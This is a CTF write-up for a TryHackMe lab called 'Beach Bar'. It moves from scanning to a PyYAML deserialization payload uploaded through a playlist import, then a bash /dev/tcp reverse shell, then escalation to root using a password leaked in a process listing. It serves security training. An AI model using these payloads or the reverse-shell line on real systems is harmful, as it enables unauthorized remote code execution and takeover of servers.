<h1 align="left">Beach Bar - PyYAML Insecure Deserialization to RCE</h1>

<p align="left">
  <img src="https://img.shields.io/static/v1?label=Category&message=Application+Attack&color=24292e&style=flat-square&v=1" /> &nbsp;
  <img src="https://img.shields.io/badge/Platform-TryHackMe-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Level-Easy-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Completed-2026, Nov 8%20-darkgreen?style=flat-square" /> &nbsp;
  <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white"  alt="LinkedIn"/></a> &nbsp;
  <a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/badge/GitHub-100000?style=flat-square&logo=github&logoColor=white" height="30" alt="GitHub"/></a> &nbsp;
</p> 

<h3>Reconnaissance</h3>
<p>Port Scanning</p>

<div align="left"><p>

|&nbsp;&nbsp;&nbsp; `22`<br>`80`|http &nbsp;&nbsp;&nbsp;<br>ssh|gunicorn<br>OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)&nbsp;&nbsp;&nbsp;                                                                       |
|--------------------------------------------------------------------------------------:|:---------------------------------------------|:---------------------------------------------|

</p></div>

```bash
# nmap -sC -sV -Pn -n -p- IPaddress
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
| http-title: Beach Bar // Sign in
|_Requested resource was /login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 08 Nov 2026 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 193
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     Server: gunicorn
|     Date: Sun, 08 Nov 2026 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Vary: Cookie
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 08 Nov 2026 xx:xx:xx GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
...
```

<br>
<p>Web Vulnerability Scanning</p>

```bash
# nikto -h http://IPaddress
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          IPaddress
+ Target Hostname:    beachbar.thm
+ Target Port:        80
+ Start Time:         2026-11-08 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: gunicorn
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, OPTIONS, HEAD 
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-11-08 xx:xx:xx (GMT0) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<p>Web Interface Inspection</p>
<p>View <code>/login</code> source code.</p>

<img width="1262" height="92" alt="image" src="https://github.com/user-attachments/assets/7bafa47d-81dd-4cdb-ad85-50c0861cb1cf" />

<br>
<p>Login with the credentials just uncovered and land in <code>/dashboard</code>.</p>
<img width="955" height="446" alt="image" src="https://github.com/user-attachments/assets/fdd29eeb-4a2d-4598-b09b-2f1b41ab7682" />

<br>
<p>Inspect <code>Export</code> and automatically download <code>playlist.yml</code>.</p>

<img width="947" height="434" alt="image" src="https://github.com/user-attachments/assets/e5b86594-c61c-41de-a4ae-c9141a605d7d" />

<br>
<p><code>playlist.yml</code></p>

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

<h3>Weaponization, Delivery & Exploitation</h3>
<p>Access <code>Import</code> and load a playlist.</p>

```yaml
!!python/object/apply:os.system ["id"]
```

<img width="1028" height="684" alt="image" src="https://github.com/user-attachments/assets/8037b57c-9d02-4583-9447-f66afb498a1b" />

<br>
<h3>Command and Control (C2)</h3>
<p>Set up a listener</p>

```bash
# nc -nlvp 6666
```

<p>Load a "playlist" to get the reverse shell.</p>

```bash
!!python/object/apply:os.system
["bash -c 'bash -i >& /dev/tcp/IPaddress/Port 0>&1'"]
```

<p>Stabilize the reverse shell for interactive access.</p>

```bash
# nc -nlvp 6666
...
bartender@tryhackme-2404:/opt/beach-bar/webapp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<pp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bartender@tryhackme-2404:/opt/beach-bar/webapp$ ^Z
[1]+  Stopped                 nc -nlvp 6666
# stty raw -echo; fg
...
bartender@tryhackme-2404:/opt/beach-bar/webapp$ export TERM=xterm
export TERM=xterm
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```


```bash
bartender@tryhackme-2404:/opt/beach-bar/webapp$ cd /home/bartender
cd /home/bartender
```

```bash
bartender@tryhackme-2404:/home/bartender$ ls
ls
user.txt
```

<h3>Actions and Objectives</h3>

```bash
bartender@tryhackme-2404:/home/bartender$ cat user.txt
cat user.txt
REDACTED
```

<p>Enumerating running processes</p>

```bash
bartender@tryhackme-2404:/home/bartender$ ps aux | grep jukebox
ps aux | grep jukebox
root         613  0.0  0.2  20176 11712 ?        Ss   18:16   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass REDACTED --bitrate 320k
bartend+    1432  0.0  0.0   7084  2172 pts/0    S+   19:12   0:00 grep --color=auto jukebox
```

<p>Privilege Escalation</p>

```bash
bartender@tryhackme-2404:/home/bartender$ su
su
Password: REDACTED
```

```bash
root@tryhackme-2404:/home/bartender# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@tryhackme-2404:/home/bartender# ls /root
ls /root
root.txt  snap
```

```bash
root@tryhackme-2404:/home/bartender# cat /root/root.txt
cat /root/root.txt
REDACTED
```
